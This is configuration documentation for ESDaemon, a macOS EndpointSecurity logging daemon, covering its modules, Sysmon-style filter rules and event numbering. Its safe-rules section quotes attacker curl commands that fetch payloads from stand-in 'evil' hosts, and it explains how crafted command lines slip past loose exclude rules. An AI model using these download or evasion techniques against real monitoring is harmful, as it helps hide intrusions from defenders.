# Configuring ESDaemon

One file controls everything: **`/usr/local/ESDaemon/configs/ESDaemon.cfg`**. The repo copy (`configs/ESDaemon.cfg`) is the default that `install.sh` writes only when no config exists yet. Re-running the installer never overwrites your changes. A config from the keep-rule version (with `[always]`, `[conditional]`, `third_party` …) is migrated once by `install.sh`; see [Upgrading](#upgrading-from-the-keep-rule-version).

**`[modules]` says what to log** (`process = start`, `file = read, write` …), and **ESDaemon logs every such event**. Nothing is selected by built-in judgement. You narrow it down with **`[include]`** and **`[exclude]`** rules, which work like a Sysmon config. What the shipped config logs and drops, and why: [DEFAULT-CONFIG.md](DEFAULT-CONFIG.md).

## The edit loop

```bash
sudo nano /usr/local/ESDaemon/configs/ESDaemon.cfg        # 1. edit
/usr/local/ESDaemon/cfg.sh /usr/local/ESDaemon/configs/ESDaemon.cfg json >/dev/null && echo ok   # 2. validate
/usr/local/ESDaemon/try.sh /path/to/raw.ndjson            # 3. optional dry-run against a capture
sudo /usr/local/ESDaemon/reload.sh                        # 4. apply (refuses an invalid cfg)
```

`reload.sh` regenerates both LaunchDaemons from the cfg and restarts the filter; eslogger is restarted only when `[modules]` changed (that restart drops eslogger's in-memory backlog and about a second of events). The filter runs the cfg as of the last successful reload (`/usr/local/ESDaemon/run/active.cfg`), so an edited but not reloaded cfg never takes effect on its own, not even after a crash or reboot.

`sudo /usr/local/ESDaemon/measure.sh 600` captures 10 minutes and lists the launches and parents that produce the most records: the candidates for an `[exclude]` rule.

## File format

- `[section]` headers, one entry per line, and `#` for comments. Blank lines are ignored. In `[settings]` and `[modules]` a `#` after a value is a comment too; in `[include]` / `[exclude]` a comment goes on its own line, and a value containing ` #` must be quoted.
- Windows line endings (CRLF), a UTF-8 BOM, tabs and trailing spaces are fine.
- **Anything cfg.sh does not recognise is an error**, not ignored: an unknown `[section]`, `[settings]` key, module object or operation, a key set twice, a `format` value it does not know, a malformed rule. `cfg.sh` prints the line number and `reload.sh` / `install.sh` change nothing.

## Sections

| Section | What it holds |
|---|---|
| `[settings]` | `subsystem`, `category`, `format`, `parent_cmdline_max`, `args_max`, `record_max` |
| `[modules]` | what to log: `<object> = <operation>, …` (see [What to log](#what-to-log-modules)). Nothing listed = `process = start` |
| `[include]` | **empty (default): every event is included.** With rules: only events matching at least one rule are logged |
| `[exclude]` | events matching any rule are never logged, even if `[include]` matched (**exclude wins**, as in Sysmon) |
| `[drop]` | old name of `[exclude]`, still accepted |

### `[settings]`

| Key | Values | Default |
|---|---|---|
| `subsystem` / `category` | unified-log destination | `com.apple.eslogger` / `events` (eslogger's own, so the Bindplane predicate's subsystem and category stay the same; it also requires `userIdentifier == 0`, the root writer) |
| `format` | `sysmon`, `sysmon+extras`, `slim`, `raw` | `sysmon+extras` in the shipped cfg. If the key is missing: `slim` (a legacy `slim = false` means `raw`) |
| `parent_cmdline_max` | characters of `ParentCommandLine` written per event (`0` = no cap). The parent's command line is repeated in every child event, so one long parent inflates all its children; the cut value ends with `…[+N chars]`. `CommandLine` is only cut to fit `record_max`. Rules match the full parent command line. | `256` |
| `args_max` | most `argv` elements rendered into `CommandLine` (`0` = no software cap, but still clamped by the ceiling below). `argv` is attacker-controlled and can hold hundreds of thousands of entries; rendering them all stalls the single-threaded filter for seconds and makes macOS drop events, so beyond this count the line is cut with a `…[+N args]` marker. Normal commands have far fewer. | `4096` |
| `record_max` | largest record (bytes) written to the unified log. The unified log keeps at most 32759 bytes of a message and cuts the rest, which leaves invalid JSON the SIEM drops whole, so this is **clamped to 32759 even when set to `0`** ("no software limit") or higher — the backend limit is real regardless of config, and a record is always kept parseable. A bigger record has its largest value (usually `CommandLine`) cut in the middle, marked `…[+N chars]…`, keeping the start and the end; one still too big after that is replaced by an `esd_record_too_large` marker that keeps the record's time, `EventID`, [event number](#event-numbers) and `Image`, where the format has them. Rules still see the full values. | `32000` |

## What to log: `[modules]`

One line per object, listing the operations to log. Operations can be separated by commas or spaces; listing an object twice adds up. Changing `[modules]` restarts eslogger on the next reload.

```
[modules]
process = start
file = read
```

| Object | Operation | Logs | EventType (EventID) |
|---|---|---|---|
| `process` | `start` | a program launched | `ProcessStart` (1) |
| | `exit` | a program ended, with its exit status | `ProcessExit` (5) |
| | `inject` | one process taking control of another: task port, remote thread, debugger attach | `ProcessInject` (10, remote thread 8) |
| `file` | `read` | a file opened for reading only | `FileRead` (101) |
| | `write` | a file that was changed, once when it is closed (not per write call) | `FileWrite` (102) |
| | `create` | a new file | `FileCreate` (11) |
| | `delete` | a file removed | `FileDelete` (23) |
| | `rename` | a file moved or renamed (`SourceFilename` → `TargetFilename`) | `FileRename` (103) |
| | `attributes` | permissions, owner, flags, ACL or extended attributes changed (e.g. quarantine removed); what changed is in `Detail` | `FileAttributes` (104) |
| `user` | `login` | console, SSH, screen sharing and screen unlock, plus authentication attempts | `UserLogin` (111) |
| | `logout` | logout, SSH logout, screen lock, screen sharing ended | `UserLogout` (112) |
| | `sudo` | sudo and su | `UserSudo` (113) |
| | `account` | user or group created, deleted or changed, password changed | `UserAccount` (114) |
| `system` | `persistence` | launch agent / daemon or login item added or removed | `SystemPersistence` (121) |
| | `malware` | XProtect detection or remediation | `SystemMalware` (122) |
| | `kernel` | kernel extension loaded or unloaded | `SystemKernel` (123) |
| | `mount` | disk or share mounted, unmounted or remounted | `SystemMount` (124) |

EventIDs follow Sysmon where Sysmon has the same event (1, 5, 8, 10, 11, 23); the 100+ numbers are ESDaemon's own. Every record carries the process that caused it (`Image`, `User`, `ProcessId`, `ProcessGuid`, code signing); file records add `TargetFilename`; records without a Sysmon shape carry the event's details in `Detail`. In `sysmon+extras` every record also carries the event's number, `GlobalSeqNum` (see [Event numbers](#event-numbers)).

**File reads and writes are very frequent** (an idle Mac opens dozens of files a second, almost all system daemons). Pair `file = read` / `write` with rules, for example:
```
[include]
EventType is ProcessStart
EventType is FileRead AND TargetFilename begin with /Users/
```

Some operations need events an older macOS's eslogger does not have; those events are skipped, and an operation with none left fails validation instead of silently logging nothing.

## How an event is decided

1. It is one of ESDaemon's own processes → **not logged** (built in, see below)
2. `[include]` has rules and none matches → **not logged**
3. an `[exclude]` rule matches → **not logged**
4. otherwise → **logged**

ESDaemon's own records and the drop markers (`eslogger_scoped_gap`, `eslogger_scoped_restart`) are always written; rules do not apply to them.

A rule that cannot be evaluated on an event never hides it: the event is logged, and `esd_rule_error` in its record says why (see [Writing safe rules](#writing-safe-rules)). If the record itself cannot be built (a malformed event, or a bug), an `esd_filter_error` marker takes its place, with the error and what identifies the event: `EventKind` (the eslogger event, e.g. `exec`), its `GlobalSeqNum` (in every format), `User`, `Image` and `ProcessId`. In the `sysmon` formats it starts with the Sysmon envelope, as the gap marker's does: `{"EventID":255,"EventType":"esd_filter_error",…}`. The filter goes on with the next event.

**ESDaemon never logs itself.** Otherwise every record it writes would create more records. Not logged: binaries under `/usr/local/ESDaemon/`, and the launchd job that runs `filter.sh` together with every process it is *responsible* for (its `cfg.sh`, `jq`, `awk` … helpers). Joining that set takes root: a launchd job, or files under `/usr/local/ESDaemon/`. That holds only while nobody else can write there, so `install.sh` and `reload.sh` refuse to run, and `esdaemon status` says `UNSAFE`, when anything in `/usr/local/ESDaemon` or a directory above it is not root's alone. The check runs only when they do: a directory that becomes writable for others in between shows up at the next install, reload or status. ESDaemon does not also match its own code signature: it is signed ad hoc, so its signing identifier is one anyone can give their own binary, and its cdhash changes with every build. An administrator running `sudo /usr/local/ESDaemon/reload.sh` by hand is logged like any other admin action.

## Pipeline liveness

A Mac whose pipeline has stopped sends nothing, and so does a quiet Mac. ESDaemon does not tell them apart in-band: it writes no heartbeat or other liveness record, so the only things in the stream are real events and the drop markers (`eslogger_scoped_gap`, `eslogger_scoped_restart`). A liveness record would share the subsystem, category and process of real events and land in the same stream the collector parses as endpoint events — exactly what does not belong in the event pipeline.

**Monitor liveness at the collector/SIEM instead.** Add a log-source-health alert that fires when a host sends no events for N minutes — the "silent log source" detection every SIEM already has, applied to macOS the same way as to every other source. Pick N from the host's normal floor: even an idle Mac logs some `ProcessStart` records, so a host that was reporting and then goes quiet for longer than it ever does when idle has a stopped pipeline, a powered-off or offline Mac, or a stuck collector — not a quiet day.

A silent host can mean the filter or eslogger is stopped or crash-looping, eslogger has lost Full Disk Access, or the unified log or the collector is stuck. Check both daemons (see [GETTING-STARTED.md](GETTING-STARTED.md#troubleshooting)) and `/var/log/ESDaemon/eslogger.stderr`. `eslogger_scoped_restart` records arriving about every 10 seconds mean eslogger keeps exiting and the filter restarts with it, most often because eslogger has no Full Disk Access.

## Event numbers

EndpointSecurity numbers the events it sends eslogger, one after another (`global_seq_num`). In `sysmon+extras`, the default, the record of every event carries that number as `GlobalSeqNum`, right after `UtcTime`; `slim` and `raw` keep it as `global_seq_num`, and plain `sysmon` has Sysmon's fields only. The `esd_filter_error` marker carries `GlobalSeqNum` in every format.

What it is good for:

- **Order.** Sorted by `GlobalSeqNum`, a Mac's records are in the order eslogger received the events, also where many share a millisecond of `UtcTime` or reached the SIEM out of order.
- **Repeats.** A collector that reads part of the log again sends those records again ([GETTING-STARTED.md](GETTING-STARTED.md#5-ship-the-events-to-your-siem)). Two records from one Mac with the same `GlobalSeqNum` and `UtcTime` are the same event.
- **Drops.** An `eslogger_scoped_gap` record says how many events EndpointSecurity dropped (its value) right after the event numbered `after_global_seq_num`. The records before the drop have a `GlobalSeqNum` of at most `after_global_seq_num`, the records after it at least `after_global_seq_num` + `eslogger_scoped_gap` + 1.

The numbers start over when eslogger restarts: after a reload that changes `[modules]`, a crash or a reboot. The filter restarts with eslogger and logs an `eslogger_scoped_restart` record before anything else, so compare numbers only between two of those. A reload that leaves `[modules]` alone restarts only the filter: it logs that record too, and the numbers go on.

**A gap in the numbers is no sign of loss.** EndpointSecurity numbers every event eslogger receives, and the filter leaves events out on purpose: `[exclude]` and `[include]` rules, opens and closes that are not a file read or write, ESDaemon's own processes. Each of those uses up a number, so records skip numbers all the time with nothing lost; with the default config, most of an idle Mac's events are left out ([DEFAULT-CONFIG.md](DEFAULT-CONFIG.md#measured-impact)). Do not alert on gaps in `GlobalSeqNum`. Lost events and records show up here:

| Lost | Shows up as |
|---|---|
| events EndpointSecurity dropped before eslogger read them | an `eslogger_scoped_gap` record, with how many |
| events while eslogger restarted | an `eslogger_scoped_restart` record; how many is not known |
| records lost after ESDaemon wrote them, in the unified log or the collector | no in-band marker; caught at the collector/SIEM by log-source-health monitoring (see [Pipeline liveness](#pipeline-liveness)) |

## Rules

The syntax uses Sysmon's own filter words, so anyone who has written a Sysmon config can read it. `[include]` and `[exclude]` use the same syntax. Each line is one rule:

```
<Field> <condition> <value>  [AND <Field> <condition> <value> ...]
```

- **Every clause on a line must match** (AND). **Separate lines are alternatives** (OR).
- **Every condition has a negated form**, so any combination can be written as lines of AND-ed clauses. Example, "exclude Apple-signed tools, except curl": `SigningId begin with com.apple. AND Image not end with /curl`.
- Matching is **case-insensitive**, like Sysmon.
- A clause on a field the event doesn't carry never matches, negated or not. For example `ParentCommandLine` is unknown when the parent started before ESDaemon: such an event is never excluded by a `ParentCommandLine` clause, and never included by one either.

**Fields** (the same names you see in the output):

| Field | Is |
|---|---|
| `EventType` | the record's name from `[modules]`: `ProcessStart`, `FileRead`, `FileWrite`, `UserLogin` … (see the table above) |
| `Image` | full path of the launched binary (exec) or of the process that caused the event (other events) |
| `CommandLine` | the launched command line, as shown in the output (exec) |
| `CurrentDirectory` | working directory of the launch (exec) |
| `ParentImage` | full path of the parent process (`/sbin/launchd` for anything launchd started: parent pid 1 from the start). For a launch: its parent (unknown when the child replaced an earlier image of itself, e.g. `sh -c 'exec curl'`, and the parent's launch was not seen). For a file or other event: the parent of the process that caused it, when that process's launch was seen, so `ParentImage begin with /opt/x/` also drops the files a tool's children write. Used by rules only; file records do not show it. |
| `ParentCommandLine` | parent's command line (exec; only if the parent's own launch was seen) |
| `User` | account name of the effective uid (from the host's user list, not the attacker-settable `USER` variable), or `uid:N` |
| `TeamId`, `SigningId`, `IsPlatformBinary` | code-signing identity of the launched binary / the acting process (`IsPlatformBinary` is `true` or `false`) |
| `TargetFilename` | the file a file event acts on (`FileCreate`, `FileDelete`, other file events where eslogger names one) |

**Conditions** (same meaning as in Sysmon):

| Condition | Matches when the field… |
|---|---|
| `is` / `is not` | equals / differs from the value |
| `is any` | equals one of `a;b;c` |
| `contains` / `excludes` | contains / doesn't contain the value |
| `contains any` / `contains all` | contains one / all of `a;b;c` |
| `excludes any` / `excludes all` | misses one / all of `a;b;c` |
| `begin with` / `not begin with` | starts / doesn't start with the value |
| `begin with any` / `end with any` | starts / ends with one of `a;b;c` |
| `end with` / `not end with` | ends / doesn't end with the value |
| `image` | is that full path **or** has that file name (`curl` matches `/usr/bin/curl`) |
| `regex` / `not regex` | matches / doesn't match the regular expression |

**Values** run to the next `AND` or the end of the line. Put a value in double quotes if it contains the word `AND`, or has spaces at either end. A lowercase `and` inside a value is fine, unless it is followed by `<Field> <condition>` (then use `AND` or quote the value). Comments go on their own line; quote a value that contains ` #`.

**Mistakes are caught before anything runs.** An unknown field, an unknown condition, a bad regex, an empty value (`""`, or a `;` list with no items), a dangling `AND`, a clause joined with lowercase `and`, an unquoted ` #` comment after a value, or free text makes `cfg.sh` and `reload.sh` fail with the offending line, and the running daemon is left as it was.

## Common changes

**Drop a noisy tool and everything it launches** (the shipped cfg does this for the Bindplane agent):
```
[exclude]
Image begin with /opt/observiq-otel-collector/
ParentImage begin with /opt/observiq-otel-collector/
```

**Drop a vendor's own binaries** (`codesign -dv /Applications/X.app 2>&1 | grep TeamIdentifier`). A shell or curl they launch is still logged, because its own Team ID differs:
```
[exclude]
TeamId is any UBF8T346G9;EQHXZ8M8AV
```

**Drop one noisy command line but keep the binary:**
```
[exclude]
Image is /usr/local/bin/jamf AND CommandLine is "/usr/local/bin/jamf policy -event recurring"
Image is /usr/bin/curl AND CommandLine begin with "curl -s https://updates.example.com/"
```

**Log only what you choose** (for example on a high-volume build server):
```
[include]
IsPlatformBinary is false
Image image curl
EventType is FileCreate AND TargetFilename contains any /LaunchAgents/;/LaunchDaemons/
```

**Exclude with an exception**: Apple-signed launches from launchd, except anything from `/tmp`:
```
[exclude]
ParentImage is /sbin/launchd AND SigningId begin with com.apple. AND Image not begin with /private/tmp/
```

## Writing safe rules

The command line is **attacker-controlled**, so a loose `[exclude]` rule is a free hiding place:

| Rule | Problem |
|---|---|
| `CommandLine contains jamf` | any command mentioning "jamf" disappears, e.g. `curl evil.sh -o /tmp/jamf` |
| `Image image curl AND CommandLine contains updates.example.com` | `curl https://evil/x -H updates.example.com` disappears |
| `Image is /usr/bin/curl AND CommandLine is "curl -s https://updates.example.com/a.pkg"` | fine: exact binary, exact command line |

`User` is the account of the process's effective uid (from the kernel audit token, resolved to a name when the filter starts; `uid:N` for accounts created since the last reload), so it cannot be forged through the environment. `Image`, `ParentImage`, `TeamId`, `SigningId` and `IsPlatformBinary` also come from the kernel and code signature. `CommandLine`, `ParentCommandLine`, `CurrentDirectory` and `TargetFilename` are chosen by whoever runs the process.

Never exclude on an attacker-controlled field alone: pin `Image`, `ParentImage` or `TeamId` too. Prefer `Image is <full path>` over `image <name>`, and `is` / `begin with` over `contains`. Test each rule with `try.sh` against a real capture and check that the logged count drops only by what you meant to drop.

**Keep regexes cheap.** A `regex` clause runs on every event that reaches it, and on `CommandLine` that is whatever the process put in its arguments, up to about 1 MB. A pattern that can match the same text in many ways, such as nested repetition (`(a+)+`, `(a|aa)*`), can keep the regex engine busy for a long time on such input. The filter handles one event at a time, so events queue up behind it and macOS starts dropping them (`eslogger_scoped_gap`). Prefer `is`, `begin with`, `end with` and `contains`. When you need a regex, keep it simple and anchored, and put it after a clause that pins the binary (`Image is …`): the clauses of a rule are checked in order, and the first one that does not match ends the check.

**A rule that fails never hides an event.** When a rule cannot be evaluated on an event (for example, the regex engine gives up), it counts as not matching in `[exclude]` and as matching in `[include]`. The event is logged in full, and `esd_rule_error` in its record names the error and the rule: `"esd_rule_error":"Regex failure: retry-limit-in-match over in [exclude]: Image image sh AND CommandLine regex (x+)+y$"`. Only rules that evaluate cleanly drop an event, so another rule that matches still excludes it. Fix or remove a rule that shows up in `esd_rule_error`: a process can make it fail on purpose, and each failure costs the filter time.

## Upgrading from the keep-rule version

Older versions kept only what built-in rules and the `[always]` / `[download]` / `[conditional]` lists picked, and chose event types with `events =`. `install.sh` detects such a config, saves it (as `ESDaemon.cfg.v1`, or with a timestamp if that exists), and writes a migrated one (`bin/migrate-cfg.sh` does the rewrite):

| Old | New |
|---|---|
| `events = …` | `[modules]` (e.g. `events = exec create` → `process = start`, `file = create`); events with no module are listed in a comment |
| `[settings]` | kept, without `third_party` and `events` |
| `[drop]` rules | `[exclude]`, unchanged |
| `[noisy_path_prefixes]` | `[exclude]` `Image begin with <path>` and `ParentImage begin with <path>` (ESDaemon's own path is built in) |
| `[noisy_team_ids]` | `[exclude]` `TeamId is any <ids>`, only if `third_party = drop_noisy` (otherwise they were never applied) |
| `[always]` `[download]` `[conditional]` | removed: they chose what to keep, and everything is kept now |

Expect more volume after the upgrade: ordinary OS activity (xpcproxy, mdworker, shells run by apps) is now logged. Run `measure.sh` and add `[exclude]` rules for what you don't want.

## Limits

- Filtering sees the command line at launch time. A download done **inside** a script (`python3 fetch.py`) shows only as the script's launch.
- `ParentCommandLine` is only known for parents launched after ESDaemon started.
- Network connections are not an eslogger event. Use DNS/proxy telemetry for them.
